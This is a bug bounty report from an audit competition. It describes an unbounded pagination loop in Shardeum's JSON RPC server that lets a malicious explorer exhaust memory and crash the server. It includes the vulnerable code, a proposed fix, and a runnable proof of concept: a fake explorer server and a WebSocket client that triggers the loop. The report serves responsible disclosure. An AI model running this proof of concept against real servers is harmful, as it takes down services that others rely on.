# #35996 \[W\&A-Insight] malicious explorer can cause denial of service in json rpc server and even cras

## #35996 \[W\&A-Insight] Malicious Explorer can cause Denial of Service in JSON RPC server and even crash it

**Submitted on Oct 15th 2024 at 12:14:14 UTC by @Blockian for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35996
* **Report Type:** Websites and Applications
* **Report severity:** Insight
* **Target:** <https://github.com/shardeum/json-rpc-server/tree/dev>
* **Impacts:**
  * Taking down the application/website

### Description

## Shardeum Ancillaries

### Malicious Explorer can cause Denial of Service in JSON RPC server and even crash it

#### Description

A vulnerability exists where a malicious explorer can cause the JSON RPC server to enter an infinite loop, eventually leading to denial of service (DoS) and a server crash due to memory exhaustion. The attack is triggered by manipulating the response of the \`getExplorerPendingTransactions\` function, forcing the server into a perpetual state of processing.

### Root Cause

The issue stems from the \`getExplorerPendingTransactions\` function: \`\`\`js async function getExplorerPendingTransactions(): Promise\<string\[]> { const explorerURL = config.explorerUrl const txHashes: string\[] = \[] let currentPage = 1 let hasMorePages = true

while (hasMorePages) { try { const response = await axios.get( \`${explorerURL}/api/originalTx?pending=true\&decode=true\&page=${currentPage}\` ) if (response.data.success) { response.data.originalTxs.forEach((tx: { txHash: string }) => { txHashes.push(tx.txHash) }) // If the current page has less than 10 transactions, it means we've reached the last page hasMorePages = response.data.originalTxs.length === 10 currentPage++ } else { hasMorePages = false } } catch (error) { console.log(error) hasMorePages = false } }

return txHashes } \`\`\` In this function, the loop continues to run as long as \`hasMorePages\` is true. A malicious explorer could manipulate the response by sending exactly 10 transactions per page, regardless of the page number, causing the loop to persist indefinitely. This exploit prevents the server from processing new requests and can ultimately crash the server due to memory overload.

### Impact

The vulnerability significantly affects the availability of the JSON RPC server. A malicious actor could trigger this flaw by continually sending the required number of transactions, leading to:

1. Denial of Service (DoS): The server becomes unresponsive, unable to process any further legitimate requests efficiently.
2. Memory Exhaustion: The \`txHashes\` array grows indefinitely as the server stores all transactions, leading to an eventual crash.

Although the impact is considered high, the requirement of the explorer to be malicious makes it, in my opinion, a medium.

But feel free to upgrade this issue's severity if you think differently \`;)\`

### Proposed fix

Limit the number of transactions the JSON RPC server is willing to receive from the \`explorer\` server, regardless if there are more of them.

### Proof of Concept

## Proof of Concept

We need to create a malicious \`explorer\` server and have it communicate with the JSON RPC server.

### Step 1

Create a new project with this \`package.json\`: \`\`\`json { "name": "tester", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "test": "echo \&quot;Error: no test specified\&quot; && exit 1" }, "author": "", "license": "ISC", "dependencies": { "express": "^4.21.1", "ws": "^8.18.0" } } \`\`\`

### Step 2

Add those two files:

server.js \`\`\`js const express = require('express'); const app = express(); const PORT = 6001;

const originalTxs = \[ { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, { txHash: '' }, ];

const sleep = ms => new Promise(r => setTimeout(r, ms));

app.get('/api/originalTx', async (req, res) => { await sleep(100)

res.json({ success: true, originalTxs: originalTxs, }); });

app.listen(PORT, () => { console.log(\`Explorer attacker server running on [http://localhost:${PORT}\\\`](https://reports.immunefi.com/shardeum-ancillaries-ii/http:/localhost:${PORT}\\`)); }); \`\`\`

main.js \`\`\`js const WebSocket = require('ws');

const wsUrl = 'ws\://localhost:8080';

const ws = new WebSocket(wsUrl);

ws.on('open', function open() { console.log('Connected to WebSocket server');

const message = { jsonrpc: '2.0', id: 1, method: 'eth\_newPendingTransactionFilter', params: \[''] }; ws.send(JSON.stringify(message));

console.log('Message sent:', message); });

let counter = 0

ws.on('message', function incoming(data) { try { const readableData = JSON.parse(data.toString()); console.log('Received from server (parsed JSON):', readableData);

```
// start the attack
if (counter &#x3D;&#x3D;&#x3D; 0) {
  counter +&#x3D; 1 // this is so it won&#x27;t run this twice
  const message &#x3D; {
    jsonrpc: &#x27;2.0&#x27;,
    id: 1,
    method: &#x27;eth_getFilterChanges&#x27;,
    params: [readableData.result]
  };
  ws.send(JSON.stringify(message));
}
```

} catch (error) { console.log('Received from server (raw string):', data.toString()); } });

ws.on('error', function error(err) { console.error('WebSocket error:', err); });

ws.on('close', function close() { console.log('Connection to WebSocket server closed'); }); \`\`\`

### Step 3

Running the POC

1. Run the JSON RPC server
2. Run the \`server.js\` with \`node server.js\`
3. Execute the attack with the websocket script by running \`main.js\` with \`node main.js\`
4. Watch the JSON RPC server get stuck and the memory grows overtime
